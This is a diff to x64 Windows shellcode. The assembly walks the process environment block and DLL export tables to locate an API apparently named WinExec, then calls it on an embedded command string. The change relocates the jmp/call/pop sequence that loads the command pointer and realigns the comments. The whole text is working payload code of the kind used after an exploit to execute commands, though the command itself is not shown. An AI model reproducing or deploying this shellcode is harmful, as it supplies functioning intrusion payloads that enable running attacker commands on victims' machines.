@@ -38,9 +38,6 @@
 
       pushx  rsi, rdi, rbx, rbp
       sub    rsp, 28h
-      jmp    load_cmd
-init_cmd:
-      pop    r10
       push   TEB.ProcessEnvironmentBlock
       pop    r11
       mov    rax, [gs:r11]
@@ -65,31 +62,32 @@ scan_dll:
       lea    rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
       lodsd
       xchg   eax, ecx
-      jecxz  next_dll        ; skip if no names
+      jecxz  next_dll                  ; skip if no names
       ; rdx = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
       lodsd
       xchg   eax, edx
-      add    rdx, rbx        ; rax = RVA2VA(rdx, rbx)
+      add    rdx, rbx                  ; rax = RVA2VA(rdx, rbx)
       ; rbp = IMAGE_EXPORT_DIRECTORY.AddressOfNames
       lodsd
       xchg   eax, ebp
-      add    rbp, rbx        ; rbp = RVA2VA(rbp, rbx)
+      add    rbp, rbx                  ; rbp = RVA2VA(rbp, rbx)
       ; rax = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
       lodsd
       xchg   eax, esi
-      add    rsi, rbx        ; rsi = RVA(rax, rbx)
+      add    rsi, rbx                  ; rsi = RVA(rax, rbx)
 find_api:
-      mov    eax, [rbp+rcx*4-4] ; eax = RVA of API string
+      mov    eax, [rbp+rcx*4-4]        ; eax = RVA of API string
       cmp    dword[rax+rbx], 'WinE'
-      loopne find_api           ; --ecx && Load not found
+      loopne find_api                  ; --ecx && Load not found
       jnz    next_dll
-      movzx  eax, word[rsi+rcx*2] ; eax = AddressOfNameOrdinals[eax]
-      mov    ecx, [rdx+rax*4]      ; ecx = base + AddressOfFunctions[eax]
+      movzx  eax, word[rsi+rcx*2]      ; eax = AddressOfNameOrdinals[eax]
+      mov    ecx, [rdx+rax*4]          ; ecx = base + AddressOfFunctions[eax]
       add    rbx, rcx
-      push   r10
-      pop    rcx
       push   SW_SHOWNORMAL
       pop    rdx
+      jmp    load_cmd
+init_cmd:
+      pop    rcx
       call   rbx
 exit_load:
       add    rsp, 28h
